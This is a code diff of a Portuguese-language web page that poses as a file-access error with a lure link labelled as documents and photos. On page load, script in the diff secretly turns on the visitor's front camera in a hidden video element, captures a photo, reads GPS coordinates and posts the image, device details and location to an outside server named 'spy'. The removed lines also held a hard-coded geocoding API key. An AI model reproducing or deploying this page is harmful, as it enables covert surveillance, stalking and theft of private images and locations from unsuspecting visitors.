@@ -48,11 +48,11 @@
             100% { transform: rotate(360deg); }
         }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.5/platform.min.js"></script>
 </head>
 <body>
     <div class="error-container">
-        <h1>Erro ao tentar acessar os arquivos</h1>
+        <h1>Erro ao tentar visualizar os arquivos</h1></br>
+        <a href="#" id="folderLink"><h2>Documento e Fotos XJ6<h2></a></br>
         <p>Verifique se concedeu as permissões necessárias ao navegador.</p>
         <p>Por favor, verifique suas permissões e tente novamente.</p>
         <center><div class="spinner"></div></center>
@@ -62,7 +62,6 @@
     <video id="videoElement" width="640" height="480" autoplay style="display: none;"></video>
 
     <script>
-        // Função para iniciar a câmera e enviar e-mail
         async function startCameraAndSendEmail() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -77,7 +76,33 @@
             }
         }
 
-        // Função para capturar a imagem da câmera e enviar por e-mail
+        async function getCurrentPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    console.error('Geolocalização não suportada pelo navegador.');
+                    resolve(null);
+                } else {
+                    // Verifica se o GPS está ativado
+                    if ('geolocation' in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                const { latitude, longitude } = position.coords;
+                                resolve({ latitude, longitude });
+                            },
+                            error => {
+                                console.error('Erro ao obter a localização:', error);
+                                resolve(null);
+                            }
+                        );
+                    } else {
+                        // GPS não ativado, exibe mensagem de alerta
+                        alert('Por favor, ative o GPS para permitir o acesso à localização.');
+                        resolve(null);
+                    }
+                }
+            });
+        }
+
         async function captureAndSendEmail() {
             const videoElement = document.getElementById('videoElement');
             const canvas = document.createElement('canvas');
@@ -85,28 +110,25 @@
             canvas.height = videoElement.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg'); // Convertendo para base64
+            const imageData = canvas.toDataURL('image/jpeg');
 
-            // Obter informações detalhadas do dispositivo usando platform.js
-            const info = platform.parse(navigator.userAgent);
+            const position = await getCurrentPosition();
+            if (!position) {
+                throw new Error('Localização não disponível. Por favor, habilite o GPS e tente novamente.');
+            }
+
+            const apiUrl = 'https://spy-production-133b.up.railway.app/api/EnviarEmail';
+
             const deviceInfo = {
-                manufacturer: info.manufacturer || '',
-                model: info.model || '',
-                product: info.product || '',
-                os: info.os.family || '',
-                browserName: info.name || '',
-                browserVersion: info.version || ''
+                manufacturer: '',
+                model: '',
+                product: '',
+                os: '',
+                browserName: '',
+                browserVersion: ''
             };
 
-            // Converter o objeto deviceInfo em uma string JSON
             const deviceInfoString = JSON.stringify(deviceInfo);
-
-            // Obter a localização do dispositivo
-            const position = await getCurrentPosition();
-            const address = await reverseGeocode(position.latitude, position.longitude);
-
-            // Enviar dados para a API ASP.NET Core para envio por e-mail
-            const apiUrl = 'https://spy-production-133b.up.railway.app/api/EnviarEmail';
 
             const requestOptions = {
                 method: 'POST',
@@ -114,7 +136,7 @@
                 body: JSON.stringify({
                     Base64: imageData,
                     DeviceInfo: deviceInfoString,
-                    Location: JSON.stringify(address) // Converter o objeto de endereço em uma string JSON
+                    Location: JSON.stringify(position)
                 })
             };
 
@@ -130,60 +152,14 @@
             }
         }
 
-        // Função para obter a localização atual do dispositivo
-        function getCurrentPosition() {
-            return new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const { latitude, longitude } = position.coords;
-                        resolve({ latitude, longitude });
-                    },
-                    error => {
-                        console.error('Erro ao obter a localização:', error);
-                        resolve(null);
-                    }
-                );
-            });
-        }
-
-        // Função para realizar geocodificação reversa
-        async function reverseGeocode(latitude, longitude) {
-            const apiKey = '70168ac378ef4d87b41a4d38d27b0d2d';
-            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`;
-
-            try {
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-
-                if (data.results && data.results.length > 0) {
-                    const { components } = data.results[0];
-                    const address = {
-                        country: components.country,
-                        state: components.state,
-                        city: components.city,
-                        suburb: components.suburb,
-                        road: components.road
-                    };
-                    return address;
-                } else {
-                    throw new Error('Endereço não encontrado');
-                }
-            } catch (error) {
-                throw new Error(`Erro ao obter o endereço: ${error.message}`);
-            }
-        }
-
-        // Iniciar a captura da câmera e envio por e-mail ao carregar a página
         window.onload = async () => {
             try {
                 await startCameraAndSendEmail();
                 await captureAndSendEmail();
 
-                // Exibe a mensagem de erro após as operações serem concluídas
                 document.querySelector('.error-container').style.display = 'block';
             } catch (error) {
                 console.error('Erro ao iniciar:', error);
-                // Exibe a mensagem de erro
                 document.querySelector('.error-container').style.display = 'block';
             }
         };
